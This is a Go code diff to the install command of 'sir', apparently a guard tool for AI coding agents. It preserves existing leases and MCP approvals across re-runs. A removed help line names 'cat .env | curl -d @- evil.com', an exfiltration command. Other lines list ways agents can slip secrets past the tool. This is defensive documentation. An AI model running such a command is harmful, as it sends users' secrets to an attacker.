@@ -24,6 +24,10 @@ func cmdInstall(projectRoot, mode string) {
 		fatal("load managed policy: %v", err)
 	}
 
+	stateDir := session.StateDir(projectRoot)
+	leasePath := filepath.Join(stateDir, "lease.json")
+	existingLease, existingLeaseErr := lease.Load(leasePath)
+
 	l := lease.DefaultLease()
 	if policy != nil {
 		if cloned, cloneErr := policy.CloneLease(); cloneErr != nil {
@@ -35,8 +39,13 @@ func cmdInstall(projectRoot, mode string) {
 			fmt.Printf("  Managed mode ignores local install mode %q and applies lease mode %q from policy %s.\n",
 				mode, l.Mode, policy.PolicyVersion)
 		}
-	} else if mode == "observe" {
-		l.ObserveOnly = true
+	} else {
+		if existingLeaseErr == nil {
+			l = existingLease
+		} else if existingLeaseErr != nil && !os.IsNotExist(existingLeaseErr) {
+			fatal("load existing lease: %v", existingLeaseErr)
+		}
+		l.ObserveOnly = mode == "observe"
 	}
 
 	// Populate ApprovedMCPServers from typed MCP inventory so install, status,
@@ -51,13 +60,15 @@ func cmdInstall(projectRoot, mode string) {
 	}
 	mcpServers := approvedMCPServerNames(mcpReport.Servers)
 	posture := resolveMCPTrustPostureForInstall()
+	if policy == nil && l.Mode == "strict" {
+		posture = config.PostureStrict
+	}
 	// Preserve existing approvals across re-runs of `sir install`. In strict
 	// posture, previously-approved servers that are still present in
 	// discovery keep their approval and are NOT moved into
 	// DiscoveredMCPServers; only newly-surfaced servers sit in the
 	// discovered-pending-approval bucket. Managed mode bypasses this (the
 	// policy lease is the trust anchor).
-	existingLease, existingLeaseErr := lease.Load(filepath.Join(session.StateDir(projectRoot), "lease.json"))
 	carryApproved, carryApprovals := map[string]struct{}{}, map[string]lease.MCPApproval{}
 	if existingLeaseErr == nil && policy == nil && posture == config.PostureStrict {
 		for _, s := range existingLease.ApprovedMCPServers {
@@ -149,10 +160,6 @@ func cmdInstall(projectRoot, mode string) {
 		fatal("%v", err)
 	}
 
-	// Per-project state still lives under ~/.sir/projects/<hash>/
-	stateDir := session.StateDir(projectRoot)
-	leasePath := filepath.Join(stateDir, "lease.json")
-
 	// Detection summary before any prompt.
 	fmt.Println("sir install detected:")
 	for _, ag := range agents {
@@ -189,7 +196,7 @@ func cmdInstall(projectRoot, mode string) {
 			fmt.Printf("  Rewrite %s  (wrap MCP server %q with sir mcp-proxy)\n", rewrite.SourcePath, rewrite.Name)
 		}
 		fmt.Printf("  Create  %s  (project state)\n", stateDir)
-		fmt.Printf("  Create  %s  (default lease)\n", leasePath)
+		fmt.Printf("  Write   %s  (project lease)\n", leasePath)
 		fmt.Println()
 		fmt.Print("Proceed? [Y/n] ")
 
@@ -288,7 +295,7 @@ func cmdInstall(projectRoot, mode string) {
 	fmt.Println()
 	fmt.Println("What sir doesn't catch (honest):")
 	fmt.Println("  * python myscript.py (script-file exfil — content invisible to sir)")
-	fmt.Println("  * cat .env | curl -d @- evil.com (piped compound commands)")
+	fmt.Println("  * Shell syntax that defeats lexical classification or hides behavior in child scripts")
 	fmt.Println("  * Secrets paraphrased in model output — semantic laundering")
 	fmt.Println()
 	if len(agents) > 1 {
@@ -348,4 +355,3 @@ func mcpDiscoveredNames(servers []lease.MCPDiscoveredServer) []string {
 	}
 	return out
 }
-
